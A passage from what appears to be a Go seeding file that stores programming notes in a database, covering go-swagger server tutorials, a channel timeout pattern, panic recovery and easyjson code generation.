\"#/definitions/error\"\n  /{id}:\n    parameters:\n      - type: integer\n        format: int64\n        name: id\n        in: path\n        required: true\n    put:\n      tags:\n        - todos\n      operationId: updateOne\n      parameters:\n        - name: body\n          in: body\n          schema:\n            $ref: \"#/definitions/item\"\n      responses:\n        200:\n          description: OK\n          schema:\n            $ref: \"#/definitions/item\"\n        default:\n          description: error\n          schema:\n            $ref: \"#/definitions/error\"\n    delete:\n      tags:\n        - todos\n      operationId: destroyOne\n      responses:\n        204:\n          description: Deleted\n        default:\n          description: error\n          schema:\n            $ref: \"#/definitions/error\"\ndefinitions:\n  item:\n    type: object\n    required:\n      - description\n    properties:\n      id:\n        type: integer\n        format: int64\n        readOnly: true\n      description:\n        type: string\n        minLength: 1\n      completed:\n        type: boolean\n  error:\n    type: object\n    required:\n      - message\n    properties:\n      code:\n        type: integer\n        format: int64\n      message:\n        type: string\n    \n// in terminal\n// swagger generate server -A todo-list -f ./swagger.yml\n// tree\n.\n├── cmd\n│   └── todo-list-server\n│       └── main.go\n├── go_build_main_go\n├── go_build_stepik\n├── go.mod\n├── go.sum\n├── models\n│   ├── error.go\n│   └── item.go\n├── restapi\n│   ├── configure_todo_list.go\n│   ├── doc.go\n│   ├── embedded_spec.go\n│   ├── operations\n│   │   ├── todo_list_api.go\n│   │   └── todos\n│   │       ├── add_one.go\n│   │       ├── add_one_parameters.go\n│   │       ├── add_one_responses.go\n│   │       ├── add_one_urlbuilder.go\n│   │       ├── destroy_one.go\n│   │       ├── destroy_one_parameters.go\n│   │       ├── destroy_one_responses.go\n│   │       ├── destroy_one_urlbuilder.go\n│   │       ├── find_todos.go\n│   │       ├── find_todos_parameters.go\n│   │       ├── find_todos_responses.go\n│   │       ├── find_todos_urlbuilder.go\n│   │       ├── get.go\n│   │       ├── get_parameters.go\n│   │       ├── get_responses.go\n│   │       ├── get_urlbuilder.go\n│   │       ├── update_one.go\n│   │       ├── update_one_parameters.go\n│   │       ├── update_one_responses.go\n│   │       └── update_one_urlbuilder.go\n│   └── server.go\n└── swagger.yml\n\n// get restapi/configure_todo_list.go here:\nhttps://github.com/go-swagger/go-swagger/blob/master/examples/tutorials/todo-list/server-complete/restapi/configure_todo_list.go\n\n// testing in terminal\ncurl -i localhost:44309 -d \"{\\\"description\\\":\\\"message $RANDOM\\\"}\" -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'\n// response like: {\"description\":\"message 32024\",\"id\":1}\ncurl -i localhost:44309/1 -X PUT -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json' -d '{\"description\":\"go shopping\"}'\n// {\"description\":\"go shopping\",\"id\":1}\ncurl -i localhost:44309/1 -X DELETE -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'\n\n// swagger serve swagger.yml\n// http://localhost:35211/docs")
	create(db, "Swagger custom server\n(tags: swagger custom server)\n---\n\nhttps://goswagger.io/tutorial/custom-server.html\n\n// swagger/swagger.yml\nswagger: '2.0'\ninfo:\n  version: 1.0.0\n  title: Greeting Server\npaths:\n  /hello:\n    get:\n      produces:\n        - text/plain\n      parameters:\n        - name: name\n          required: false\n          type: string\n          in: query\n          description: defaults to World if not given\n      operationId: getGreeting\n      responses:\n        200:\n          description: returns a greeting\n          schema:\n            type: string\n            description: contains the actual greeting as plain text\n      \n// swagger generate server -t gen -f ./swagger/swagger.yml --exclude-main -A greeter\n// tree\n.\n├── cmd\n│   └── greeter\n├── gen\n│   └── restapi\n│       ├── configure_greeter.go\n│       ├── doc.go\n│       ├── embedded_spec.go\n│       ├── operations\n│       │   ├── get_greeting.go\n│       │   ├── get_greeting_parameters.go\n│       │   ├── get_greeting_responses.go\n│       │   ├── get_greeting_urlbuilder.go\n│       │   └── greeter_api.go\n│       └── server.go\n└── swagger\n    └── swagger.yml\n\n// cmd/greeter/main.go\npackage main\n\nimport (\n  \"flag\"\n  \"fmt\"\n  \"github.com/go-openapi/loads\"\n  \"github.com/go-openapi/runtime/middleware\"\n  \"github.com/go-openapi/swag\"\n  \"log\"\n  \"stepik/gen/restapi\"\n  \"stepik/gen/restapi/operations\"\n)\n\nvar portFlag = flag.Int(\"port\", 3000, \"Port to run this service on\")\n\nfunc main() {\n  // load embedded swagger file\n  swaggerSpec, err := loads.Analyzed(restapi.SwaggerJSON, \"\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n\n  // create new service API\n  api := operations.NewGreeterAPI(swaggerSpec)\n  server := restapi.NewServer(api)\n  defer server.Shutdown()\n\n  // parse flags\n  flag.Parse()\n  // set the port this service will be run on\n  server.Port = *portFlag\n\n  // set Handle\n  api.GetGreetingHandler = operations.GetGreetingHandlerFunc(\n    func(params operations.GetGreetingParams) middleware.Responder {\n      name := swag.StringValue(params.Name)\n      if name == \"\" {\n        name = \"World\"\n      }\n\n      greeting := fmt.Sprintf(\"Hello, %s!\", name)\n      return operations.NewGetGreetingOK().WithPayload(greeting)\n    })\n\n  // serve API\n  if err := server.Serve(); err != nil {\n    log.Fatalln(err)\n  }\n}\n\n// 127.0.0.1:3000/hello?name=Bob\n// Hello, Bob!\n\n// swagger serve swagger/swagger.yml\n// http://localhost:35211/docs")
	create(db, "Using timeout without context\n(tags: timeout without context)\n---\n\npackage main\n\nimport (\n  \"fmt\"\n  \"time\"\n)\n\nfunc main() {\n  SendValue()\n}\n\nfunc SendValue(){\n  sendChan := make(chan bool, 1)\n\n  go func() {\n    sendChan <- Send()\n  }()\n\n  select {\n  case <-sendChan:\n    fmt.Println(\"case <-sendChan\")\n  case <-time.After(3 * time.Second):\n    fmt.Println(\"case <-time.After(3 * time.Second)\")\n    return\n  }\n\n  //continue logic in case send didn't timeout\n}\n\nfunc Send() bool {\n  time.Sleep(5 * time.Second)\n  return true\n}")
	create(db, "Recover\n(tags: recover)\n---\n\n// in top of function\ndefer func() {\n  if err := recover(); err != nil {\n    fmt.Println(err)\n  }\n}()")
	create(db, "Easyjson\n(tags: easyjson)\n---\n\ngo get -u github.com/mailru/easyjson/...\n// remove vendor folder (you can return it after generating)\n\n// main.go\npackage main\n\nimport (\n  \"encoding/json\"\n  \"fmt\"\n  \"stepik/model\"\n)\n\nfunc main() {\n  fmt.Println(\"fd\")\n  m := model.Model{\n    Id:    1,\n    Name:  \"dkfjsl\",\n    Price: 3230,\n  }\n  // компилятор увидит что для данной структуры реализован метод MarshalJSON() в model_easyjson.go и будет использовать его\n  data, err := json.Marshal(m) \n  if err != nil {\n    panic(err)\n  }\n  fmt.Println(string(data))\n  var mm model.Model\n  json.Unmarshal(data, &mm)\n  fmt.Printf(\"%+v\", mm)\n}\n\n// в package main не будет генерировать, поэтому структуры надо выносить в другие package\n// model/model.go\npackage model\n\n//easyjson:json\ntype Model struct {\n  Id    int     `json:\"id\"`\n  Name  string  `json:\"name\"`\n  Price float64 `json:\"price\"`\n}\n\ntype Model2 struct {\n  Id    int     `json:\"id\"`\n  Name  string  `json:\"name\"`\n  Price float64 `json:\"price\"`\n}\n\n// easyjson model/model.go\n// in model folder in file model_easyjson.go you see generated code for Model (not for Model2)")

	//create(db, "")
	//create(db, "")
	//create(db, "")

}
